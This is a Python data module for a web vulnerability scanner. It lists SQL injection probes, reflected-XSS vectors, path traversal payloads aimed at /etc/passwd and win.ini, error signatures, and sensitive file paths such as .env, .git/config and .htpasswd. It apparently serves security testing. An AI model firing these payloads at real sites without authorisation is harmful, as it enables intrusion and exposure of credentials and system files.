# -*- coding: utf-8 -*-
"""Vulnerability scanner payload and error-signature data.

Pure data — no logic. Import these lists in scanners to probe targets.
"""

# ---------------------------------------------------------------------------
# SQL Injection payloads — non-destructive, error-discovery oriented
# ---------------------------------------------------------------------------

SQLI_PAYLOADS: list[dict[str, str]] = [
    {"payload": "' OR '1'='1", "desc": "tautology"},
    {"payload": "'", "desc": "single quote"},
    {"payload": "1' ORDER BY 1--", "desc": "order-by probe"},
    {"payload": "1' ORDER BY 10--", "desc": "order-by overshoot"},
    {"payload": "1' UNION SELECT NULL--", "desc": "union null probe"},
    {"payload": "admin'--", "desc": "comment-prefix auth bypass"},
    {"payload": "' AND 1=1--", "desc": "AND tautology"},
    {"payload": "' AND 1=2--", "desc": "AND false"},
]

SQLI_ERROR_SIGNATURES: dict[str, list[str]] = {
    "mysql": [
        "you have an error in your sql syntax",
        "mysql_fetch",
        "mysql_num_rows",
        "mysqli_error",
        "mysql_error",
        "sql syntax you have an error",
        "warning: mysql",
        "unclosed quotation mark",
    ],
    "postgres": [
        "postgresql",
        "pg_query",
        "pg_num_rows",
        "psql",
        "syntax error near",
        "unterminated quoted string",
    ],
    "mssql": [
        "microsoft sql server",
        "odbc sql server",
        "mssql",
        "unclosed quotation mark after the character string",
    ],
    "oracle": [
        "ora-009",
        "oracle",
        "java.sql.sqlexception",
        "oci8",
    ],
    "sqlite": [
        "sqlite",
        "sqlite3",
        "near \"\:",
        "unterminated quoted string",
    ],
}

# ---------------------------------------------------------------------------
# Reflected XSS canary payloads — each probe uses a unique canary token
# ---------------------------------------------------------------------------

XSS_CANARY_PAYLOADS: list[dict[str, str]] = [
    {"vector": "<script>{canary}</script>", "desc": "script tag"},
    {"vector": "<img src=x onerror=alert('{canary}')>", "desc": "img onerror"},
    {"vector": "<svg onload=alert('{canary}')>", "desc": "svg onload"},
    {"vector": "<body onload=alert('{canary}')>", "desc": "body onload"},
    {"vector": "<iframe src=javascript:alert('{canary}')>", "desc": "iframe javascript"},
    {"vector": "<details open ontoggle=alert('{canary}')>", "desc": "details ontoggle"},
    {"vector": "<script>document.write('{canary}')</script>", "desc": "document.write"},
]


# ---------------------------------------------------------------------------
# Directory traversal payloads
# ---------------------------------------------------------------------------

TRAVERSAL_PAYLOADS: list[dict[str, str]] = [
    {"payload": "../etc/passwd", "desc": "../etc/passwd"},
    {"payload": "..%2f..%2fetc/passwd", "desc": "..%2f..%2fetc/passwd"},
    {"payload": "..%252f..%252fetc/passwd", "desc": "double-encoded slash"},
    {"payload": "....//....//etc/passwd", "desc": "dot-dot-slash bypass"},
    {"payload": "..\\..\\windows\\win.ini", "desc": "Windows backslash traversal"},
    {"payload": "..%2f..%2fwindows%2fwin.ini", "desc": "Windows URL-encoded traversal"},
    {"payload": "%2e%2e%2f%2e%2e%2fetc/passwd", "desc": "fully-encoded dots/slash"},
    {"payload": "..;/..;/etc/passwd", "desc": "semicolon bypass (Tomcat)"},
]

TRAVERSAL_CONTENT_SIGNATURES: dict[str, list[str]] = {
    "passwd": [
        "root:",
        "/bin/bash",
        "/usr/sbin/nologin",
        "daemon:x:",
    ],
    "win_ini": [
        "[extensions]",
        "[fonts]",
        "[files]",
        "MPEGVideo",
    ],
    "httpd_conf": [
        "ServerRoot",
        "Listen ",
        "DocumentRoot",
    ],
}

# ---------------------------------------------------------------------------
# Sensitive file candidates — appended to crawled URL paths
# ---------------------------------------------------------------------------

SENSITIVE_FILES: list[dict[str, str]] = [
    {"path": ".env", "severity": "High", "desc": "Environment file (secrets)"},
    {"path": ".env.local", "severity": "High", "desc": "Environment file (local)"},
    {"path": ".git/config", "severity": "Medium", "desc": "Git config"},
    {"path": ".git/HEAD", "severity": "Medium", "desc": "Git HEAD reference"},
    {"path": "backup.sql", "severity": "High", "desc": "Database backup"},
    {"path": "backup.sql.bak", "severity": "High", "desc": "Database backup (bak)"},
    {"path": "db.sql", "severity": "High", "desc": "Database dump"},
    {"path": "wp-config.php.bak", "severity": "High", "desc": "WordPress config backup"},
    {"path": "wp-config.php.old", "severity": "High", "desc": "WordPress config old"},
    {"path": "config.php.bak", "severity": "Medium", "desc": "PHP config backup"},
    {"path": "config.php.old", "severity": "Medium", "desc": "PHP config old"},
    {"path": "admin.php.bak", "severity": "Medium", "desc": "Admin backup"},
    {"path": "admin.php.old", "severity": "Medium", "desc": "Admin old"},
    {"path": ".htaccess", "severity": "Low", "desc": "Apache config"},
    {"path": ".htpasswd", "severity": "Medium", "desc": "Apache password file"},
    {"path": "phpinfo.php", "severity": "High", "desc": "PHP info exposure"},
    {"path": "info.php", "severity": "High", "desc": "PHP info exposure"},
    {"path": "server-status", "severity": "Low", "desc": "Apache server-status"},
    {"path": "server-info", "severity": "Low", "desc": "Apache server-info"},
]
